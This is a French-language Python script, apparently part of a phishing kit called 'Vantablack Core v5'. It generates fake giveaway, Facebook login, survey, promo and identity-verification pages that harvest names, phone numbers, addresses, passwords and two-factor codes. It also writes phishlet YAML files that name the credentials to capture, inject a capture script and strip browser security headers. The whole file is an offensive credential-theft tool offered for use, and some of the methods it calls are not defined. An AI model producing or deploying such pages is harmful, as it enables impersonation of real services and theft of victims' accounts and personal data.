#!/usr/bin/env python3
"""
Vantablack Core v5 - Générateur de Pages Personnalisées
Création de pages de giveaway, campagnes et liens déguisés
"""

import os
import json
import yaml
import random
import string
from pathlib import Path
from datetime import datetime, timedelta

class Colors:
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class PageGenerator:
    def __init__(self):
        self.project_root = Path(__file__).parent
        self.templates_dir = self.project_root / "templates"
        self.custom_dir = self.project_root / "custom_pages"
        self.custom_dir.mkdir(exist_ok=True)
        
        # Templates de base
        self.templates = {
            "giveaway": self.get_giveaway_template(),
            "login": self.get_login_template(),
            "survey": self.get_survey_template(),
            "promo": self.get_promo_template(),
            "verification": self.get_verification_template()
        }
    
    def get_giveaway_template(self):
        """Template pour les giveaways"""
        return """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title}}</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .container { max-width: 600px; margin: 50px auto; padding: 30px; background: rgba(255,255,255,0.1); border-radius: 15px; }
        .logo { text-align: center; margin-bottom: 20px; }
        .prize { font-size: 24px; font-weight: bold; text-align: center; margin: 20px 0; }
        .countdown { background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; text-align: center; margin: 20px 0; }
        .form-group { margin: 15px 0; }
        input, select { width: 100%; padding: 12px; border: none; border-radius: 5px; margin: 5px 0; }
        button { background: #ff6b6b; color: white; padding: 15px; border: none; border-radius: 5px; width: 100%; font-size: 18px; cursor: pointer; }
        button:hover { background: #ff5252; }
        .winner-count { text-align: center; font-size: 18px; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <h1>🎁 {{company}} GIVEAWAY 🎁</h1>
        </div>
        
        <div class="prize">
            {{prize_description}}
        </div>
        
        <div class="countdown">
            ⏰ Temps restant: <span id="countdown">{{countdown}}</span>
        </div>
        
        <div class="winner-count">
            🏆 {{winner_count}} gagnants seront sélectionnés!
        </div>
        
        <form action="/submit" method="post">
            <div class="form-group">
                <input type="text" name="full_name" placeholder="Nom complet" required>
            </div>
            
            <div class="form-group">
                <input type="email" name="email" placeholder="Adresse email" required>
            </div>
            
            <div class="form-group">
                <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
            </div>
            
            <div class="form-group">
                <select name="country" required>
                    <option value="">Sélectionnez votre pays</option>
                    <option value="fr">France</option>
                    <option value="be">Belgique</option>
                    <option value="ch">Suisse</option>
                    <option value="ca">Canada</option>
                </select>
            </div>
            
            <button type="submit">🎯 PARTICIPER MAINTENANT</button>
        </form>
        
        <p style="text-align: center; margin-top: 20px; font-size: 12px;">
            *En participant, vous acceptez nos conditions générales
        </p>
    </div>
    
    <script>
        // Compte à rebours
        function updateCountdown() {
            const endTime = new Date('{{end_time}}').getTime();
            const now = new Date().getTime();
            const distance = endTime - now;
            
            const hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
            const minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
            const seconds = Math.floor((distance % (1000 * 60)) / 1000);
            
            document.getElementById("countdown").innerHTML = hours + "h " + minutes + "m " + seconds + "s ";
            
            if (distance < 0) {
                document.getElementById("countdown").innerHTML = "TERMINÉ";
            }
        }
        
        setInterval(updateCountdown, 1000);
        updateCountdown();
    </script>
</body>
</html>"""
    
    def get_login_template(self):
        """Template pour les pages de login"""
        return """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion {{service}} - Sécurité requise</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, sans-serif; background: #f5f5f7; }
        .login-container { max-width: 400px; margin: 100px auto; padding: 40px; background: white; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.1); }
        .logo { text-align: center; margin-bottom: 30px; }
        .alert { background: #fff3cd; color: #856404; padding: 15px; border-radius: 5px; margin: 15px 0; border-left: 4px solid #ffc107; }
        .form-group { margin: 20px 0; }
        input { width: 100%; padding: 15px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
        input:focus { border-color: #007bff; outline: none; }
        button { width: 100%; padding: 15px; background: #007bff; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
        button:hover { background: #0056b3; }
        .footer { text-align: center; margin-top: 20px; color: #666; font-size: 12px; }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">
            <h2>🔒 Connexion {{service}}</h2>
            <p>Veuillez vous connecter pour continuer</p>
        </div>
        
        <div class="alert">
            ⚠️ Pour des raisons de sécurité, une vérification de compte est requise
        </div>
        
        <form action="/auth" method="post">
            <div class="form-group">
                <input type="text" name="username" placeholder="Nom d'utilisateur ou email" required>
            </div>
            
            <div class="form-group">
                <input type="password" name="password" placeholder="Mot de passe" required>
            </div>
            
            <div class="form-group">
                <input type="text" name="2fa_code" placeholder="Code de vérification (si activé)">
            </div>
            
            <button type="submit">→ Se connecter</button>
        </form>
        
        <div class="footer">
            <p>© {{year}} {{service}}. Tous droits réservés.</p>
            <p><a href="#" style="color: #007bff;">Aide</a> • <a href="#" style="color: #007bff;">Confidentialité</a></p>
        </div>
    </div>
</body>
</html>"""
    
    def get_survey_template(self):
        """Template pour les sondages"""
        return """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title}}</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; }
        .container { max-width: 600px; margin: 50px auto; padding: 30px; background: rgba(255,255,255,0.1); border-radius: 15px; }
        .header { text-align: center; margin-bottom: 30px; }
        .reward { background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; text-align: center; margin: 20px 0; }
        .question { margin: 20px 0; }
        .options label { display: block; margin: 10px 0; padding: 10px; background: rgba(255,255,255,0.1); border-radius: 5px; cursor: pointer; }
        .options label:hover { background: rgba(255,255,255,0.2); }
        input[type="text"], input[type="email"], select { width: 100%; padding: 12px; border: none; border-radius: 5px; margin: 5px 0; }
        button { background: #28a745; color: white; padding: 15px; border: none; border-radius: 5px; width: 100%; font-size: 18px; cursor: pointer; }
        button:hover { background: #218838; }
        .progress { background: rgba(255,255,255,0.2); height: 10px; border-radius: 5px; margin: 20px 0; }
        .progress-bar { background: #ff6b6b; height: 100%; border-radius: 5px; width: 50%; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📊 {{survey_title}}</h1>
            <p>{{survey_description}}</p>
        </div>
        
        <div class="reward">
            <h3>🎁 Récompense: {{reward}}</h3>
            <p>{{reward_description}}</p>
        </div>
        
        <div class="progress">
            <div class="progress-bar"></div>
        </div>
        
        <form action="/submit_survey" method="post">
            <div class="question">
                <h3>1. {{question1}}</h3>
                <div class="options">
                    <label><input type="radio" name="q1" value="option1" required> {{option1_1}}</label>
                    <label><input type="radio" name="q1" value="option2"> {{option1_2}}</label>
                    <label><input type="radio" name="q1" value="option3"> {{option1_3}}</label>
                </div>
            </div>
            
            <div class="question">
                <h3>2. {{question2}}</h3>
                <div class="options">
                    <label><input type="radio" name="q2" value="option1" required> {{option2_1}}</label>
                    <label><input type="radio" name="q2" value="option2"> {{option2_2}}</label>
                    <label><input type="radio" name="q2" value="option3"> {{option2_3}}</label>
                </div>
            </div>
            
            <div class="question">
                <h3>3. Informations personnelles</h3>
                <input type="text" name="full_name" placeholder="Nom complet" required>
                <input type="email" name="email" placeholder="Adresse email" required>
                <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
                <select name="age_group" required>
                    <option value="">Sélectionnez votre tranche d'âge</option>
                    <option value="18-24">18-24 ans</option>
                    <option value="25-34">25-34 ans</option>
                    <option value="35-44">35-44 ans</option>
                    <option value="45+">45+ ans</option>
                </select>
            </div>
            
            <button type="submit">✅ Soumettre le sondage</button>
        </form>
        
        <div style="text-align: center; margin-top: 20px; font-size: 12px; opacity: 0.8;">
            {{participants_count}} personnes ont déjà participé
        </div>
    </div>
</body>
</html>"""
    
    def get_promo_template(self):
        """Template pour les pages promotionnelles"""
        return """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title}}</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #ff6b6b 0%, #ee5a24 100%); color: white; }
        .container { max-width: 600px; margin: 50px auto; padding: 30px; background: rgba(255,255,255,0.1); border-radius: 15px; }
        .header { text-align: center; margin-bottom: 30px; }
        .discount-badge { background: #ff9f43; color: #2f3542; padding: 10px 20px; border-radius: 25px; font-size: 24px; font-weight: bold; margin: 20px 0; }
        .countdown { background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; text-align: center; margin: 20px 0; }
        .product-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; margin: 20px 0; }
        .product { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; text-align: center; }
        .old-price { text-decoration: line-through; opacity: 0.7; }
        .new-price { font-size: 18px; font-weight: bold; color: #ff9f43; }
        .cta-button { background: #ff9f43; color: #2f3542; padding: 15px 30px; border: none; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; margin: 20px 0; }
        .cta-button:hover { background: #ffaf53; }
        .testimonials { background: rgba(255,255,255,0.1); padding: 20px; border-radius: 10px; margin: 20px 0; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔥 {{promo_title}}</h1>
            <p>{{promo_description}}</p>
        </div>
        
        <div class="discount-badge">
            -{{discount_percent}}% SUR TOUT
        </div>
        
        <div class="countdown">
            ⏰ Offre valable jusqu'au: {{end_date}} | <span id="countdown">{{countdown}}</span>
        </div>
        
        <div class="product-grid">
            <div class="product">
                <h3>{{product1_name}}</h3>
                <p class="old-price">{{product1_old_price}}€</p>
                <p class="new-price">{{product1_new_price}}€</p>
                <button class="cta-button" onclick="selectProduct('{{product1_name}}')">Sélectionner</button>
            </div>
            <div class="product">
                <h3>{{product2_name}}</h3>
                <p class="old-price">{{product2_old_price}}€</p>
                <p class="new-price">{{product2_new_price}}€</p>
                <button class="cta-button" onclick="selectProduct('{{product2_name}}')">Sélectionner</button>
            </div>
        </div>
        
        <div class="testimonials">
            <h3>🎯 Comment ça marche?</h3>
            <p>1. Sélectionnez votre produit préféré</p>
            <p>2. Remplissez vos informations pour la livraison</p>
            <p>3. Profitez de votre réduction exclusive!</p>
        </div>
        
        <form action="/claim_offer" method="post" style="display: none;" id="offer-form">
            <input type="hidden" name="selected_product" id="selected-product">
            <h3>📋 Informations de livraison</h3>
            <input type="text" name="full_name" placeholder="Nom complet" required>
            <input type="email" name="email" placeholder="Adresse email" required>
            <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
            <input type="text" name="address" placeholder="Adresse complète" required>
            <input type="text" name="city" placeholder="Ville" required>
            <input type="text" name="zipcode" placeholder="Code postal" required>
            
            <button type="submit" class="cta-button">🎁 Réclamer mon offre</button>
        </form>
        
        <div style="text-align: center; margin-top: 20px; font-size: 12px; opacity: 0.8;">
            {{claimed_count}} offres déjà réclamées aujourd'hui
        </div>
    </div>
    
    <script>
        function selectProduct(productName) {
            document.getElementById('selected-product').value = productName;
            document.getElementById('offer-form').style.display = 'block';
            window.scrollTo(0, document.body.scrollHeight);
        }
    </script>
</body>
</html>"""
    
    def get_verification_template(self):
        """Template pour les pages de vérification"""
        return """<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{title}}</title>
    <style>
        body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #00b894 0%, #0984e3 100%); color: white; }
        .container { max-width: 500px; margin: 50px auto; padding: 30px; background: rgba(255,255,255,0.1); border-radius: 15px; }
        .header { text-align: center; margin-bottom: 30px; }
        .security-badge { background: rgba(255,255,255,0.2); padding: 15px; border-radius: 10px; text-align: center; margin: 20px 0; }
        .step-indicator { display: flex; justify-content: space-between; margin: 30px 0; }
        .step { text-align: center; flex: 1; }
        .step-number { background: #00b894; width: 30px; height: 30px; border-radius: 50%; display: inline-block; line-height: 30px; }
        .step.active .step-number { background: #fd79a8; }
        .verification-method { background: rgba(255,255,255,0.1); padding: 15px; border-radius: 10px; margin: 15px 0; cursor: pointer; }
        .verification-method:hover { background: rgba(255,255,255,0.2); }
        .verification-method.selected { background: rgba(255,255,255,0.3); border: 2px solid #fd79a8; }
        input[type="text"], input[type="email"], input[type="tel"], select { width: 100%; padding: 12px; border: none; border-radius: 5px; margin: 5px 0; }
        button { background: #fd79a8; color: white; padding: 15px; border: none; border-radius: 5px; width: 100%; font-size: 18px; cursor: pointer; }
        button:hover { background: #e84393; }
        .help-text { font-size: 12px; opacity: 0.8; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 {{verification_title}}</h1>
            <p>{{verification_description}}</p>
        </div>
        
        <div class="security-badge">
            <h3>🛡️ Sécurité renforcée activée</h3>
            <p>Cette vérification protège votre compte contre les accès non autorisés</p>
        </div>
        
        <div class="step-indicator">
            <div class="step active">
                <div class="step-number">1</div>
                <div>Identité</div>
            </div>
            <div class="step">
                <div class="step-number">2</div>
                <div>Vérification</div>
            </div>
            <div class="step">
                <div class="step-number">3</div>
                <div>Confirmation</div>
            </div>
        </div>
        
        <form action="/verify_identity" method="post">
            <h3>📋 Informations personnelles</h3>
            <input type="text" name="full_name" placeholder="Nom complet" required>
            <input type="email" name="email" placeholder="Adresse email" required>
            <input type="tel" name="phone" placeholder="Numéro de téléphone" required>
            
            <h3>🔐 Méthode de vérification</h3>
            <div class="verification-method" onclick="selectMethod('sms')">
                <h4>📱 Code par SMS</h4>
                <p>Recevez un code de vérification sur votre téléphone</p>
            </div>
            
            <div class="verification-method" onclick="selectMethod('email')">
                <h4>📧 Code par Email</h4>
                <p>Recevez un code de vérification par email</p>
            </div>
            
            <div class="verification-method" onclick="selectMethod('authenticator')">
                <h4>🔑 Application Authenticator</h4>
                <p>Utilisez votre application d'authentification</p>
            </div>
            
            <input type="hidden" name="verification_method" id="verification-method" required>
            
            <div id="code-field" style="display: none;">
                <h3>🔢 Code de vérification</h3>
                <input type="text" name="verification_code" placeholder="Entrez le code reçu" pattern="[0-9]{6}" maxlength="6">
                <p class="help-text">Un code à 6 chiffres vous a été envoyé</p>
            </div>
            
            <button type="submit" id="submit-btn">✅ Vérifier mon identité</button>
        </form>
        
        <div style="text-align: center; margin-top: 20px; font-size: 12px; opacity: 0.8;">
            {{verified_count}} comptes vérifiés aujourd'hui
        </div>
    </div>
    
    <script>
        function selectMethod(method) {
            document.querySelectorAll('.verification-method').forEach(el => el.classList.remove('selected'));
            event.currentTarget.classList.add('selected');
            document.getElementById('verification-method').value = method;
            document.getElementById('code-field').style.display = 'block';
            document.getElementById('submit-btn').textContent = '✅ Vérifier mon identité';
        }
    </script>
</body>
</html>"""
    
    def generate_random_url(self, length=8):
        """Génère une URL aléatoire"""
        chars = string.ascii_lowercase + string.digits
        return ''.join(random.choice(chars) for _ in range(length))
    
    def create_giveaway_page(self, config):
        """Crée une page de giveaway"""
        template = self.templates["giveaway"]
        
        # Configuration par défaut
        defaults = {
            "title": "GIVEAWAY EXCLUSIF",
            "company": "Instagram",
            "prize_description": "iPhone 15 Pro Max + 1000€ de cadeaux",
            "countdown": "24:00:00",
            "end_time": (datetime.now() + timedelta(hours=24)).isoformat(),
            "winner_count": "10"
        }
        
        config = {**defaults, **config}
        
        # Remplir le template
        content = template
        for key, value in config.items():
            content = content.replace(f"{{{{{key}}}}}", str(value))
        
        # Générer un nom de fichier aléatoire
        filename = f"giveaway_{self.generate_random_url()}.html"
        filepath = self.custom_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return filename, filepath
    
    def create_login_page(self, config):
        """Crée une page de login"""
        template = self.templates["login"]
        
        defaults = {
            "service": "Facebook",
            "year": datetime.now().year
        }
        
        config = {**defaults, **config}
        
        content = template
        for key, value in config.items():
            content = content.replace(f"{{{{{key}}}}}", str(value))
        
        filename = f"login_{self.generate_random_url()}.html"
        filepath = self.custom_dir / filename
        
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(content)
        
        return filename, filepath
    
    def create_phishlet_for_custom_page(self, page_type, page_config, target_service):
        """Crée un phishlet pour une page personnalisée"""
        
        phishlet_template = {
            "name": f"Custom {page_type.capitalize()}",
            "author": "Vanta v5 Generator",
            "min_ver": "5.0.0",
            "proxy_hosts": [
                {"subdomain": "promo", "target": "example.com"}
            ],
            "auth_urls": ["/submit", "/auth"],
            "landing_path": ["/"],
            "auth_tokens": [
                {"type": "cookie", "name": "session_id"}
            ],
            "credentials": [
                {"type": "post_param", "name": "email", "regex": "^[^@]+@[^@]+\\.[^@]+$"},
                {"type": "post_param", "name": "password", "regex": None},
                {"type": "post_param", "name": "phone", "regex": "^\\+[0-9]{1,15}$"}
            ],
            "injections": [
                {"type": "js", "path": "/core/assets/js/capture.js", "trigger": "load"}
            ],
            "headers": [
                {"action": "remove", "name": "Content-Security-Policy"},
                {"action": "remove", "name": "X-Frame-Options"}
            ],
            "cors": {
                "mode": "allow_all",
                "methods": ["GET", "POST", "OPTIONS"],
                "headers": ["*"]
            }
        }
        
        # Adapter selon le type de page
        if page_type == "giveaway":
            phishlet_template["name"] = f"Giveaway {target_service}"
            phishlet_template["credentials"].extend([
                {"type": "post_param", "name": "full_name", "regex": None},
                {"type": "post_param", "name": "country", "regex": None}
            ])
        
        filename = f"custom_{page_type}_{self.generate_random_url(6)}.yaml"
        filepath = self.project_root / "phishlets" / filename
        
        with open(filepath, 'w') as f:
            yaml.dump(phishlet_template, f, default_flow_style=False)
        
        return filename
    
    def interactive_generator(self):
        """Interface interactive pour générer des pages"""
        print(f"{Colors.BOLD}{Colors.CYAN}=== GÉNÉRATEUR DE PAGES PERSONNALISÉES ==={Colors.RESET}")
        
        while True:
            print(f"\n{Colors.GREEN}1.{Colors.RESET} Créer une page Giveaway")
            print(f"{Colors.GREEN}2.{Colors.RESET} Créer une page de Login")
            print(f"{Colors.GREEN}3.{Colors.RESET} Créer un phishlet personnalisé")
            print(f"{Colors.GREEN}4.{Colors.RESET} Lister les pages existantes")
            print(f"{Colors.GREEN}0.{Colors.RESET} Retour")
            
            choice = input(f"\n{Colors.YELLOW}➤ Choix: {Colors.RESET}").strip()
            
            if choice == "1":
                self.create_giveaway_interactive()
            elif choice == "2":
                self.create_login_interactive()
            elif choice == "3":
                self.create_custom_phishlet_interactive()
            elif choice == "4":
                self.list_existing_pages()
            elif choice == "0":
                break
            else:
                print(f"{Colors.RED}❌ Choix invalide{Colors.RESET}")
    
    def create_giveaway_interactive(self):
        """Crée une page giveaway interactivement"""
        print(f"\n{Colors.BLUE}🎁 Création d'une page Giveaway{Colors.RESET}")
        
        config = {
            "company": input(f"{Colors.YELLOW}➤ Nom de l'entreprise/Service: {Colors.RESET}") or "Instagram",
            "prize_description": input(f"{Colors.YELLOW}➤ Description du prix: {Colors.RESET}") or "iPhone 15 Pro Max + 1000€ de cadeaux",
            "winner_count": input(f"{Colors.YELLOW}➤ Nombre de gagnants: {Colors.RESET}") or "5"
        }
        
        filename, filepath = self.create_giveaway_page(config)
        
        print(f"{Colors.GREEN}✅ Page créée: {filename}{Colors.RESET}")
        print(f"{Colors.CYAN}📁 Emplacement: {filepath}{Colors.RESET}")
        
        # Proposer de créer un phishlet associé
        if input(f"{Colors.YELLOW}➤ Créer un phishlet associé? (o/n): {Colors.RESET}").lower() == 'o':
            phishlet_name = self.create_phishlet_for_custom_page("giveaway", config, config["company"])
            print(f"{Colors.GREEN}✅ Phishlet créé: {phishlet_name}{Colors.RESET}")
    
    def list_existing_pages(self):
        """Liste les pages personnalisées existantes"""
        pages = list(self.custom_dir.glob("*.html"))
        
        if not pages:
            print(f"{Colors.YELLOW}ℹ️ Aucune page personnalisée trouvée{Colors.RESET}")
            return
        
        print(f"\n{Colors.BOLD}📄 Pages personnalisées:{Colors.RESET}")
        for page in pages:
            print(f"  - {page.name}")

def main():
    """Point d'entrée principal"""
    generator = PageGenerator()
    
    print(f"{Colors.BOLD}{Colors.MAGENTA}🎯 Générateur de Pages Vantablack v5{Colors.RESET}")
    print(f"{Colors.YELLOW}Créez des pages personnalisées pour giveaways et campagnes{Colors.RESET}")
    
    generator.interactive_generator()

if __name__ == "__main__":
    main()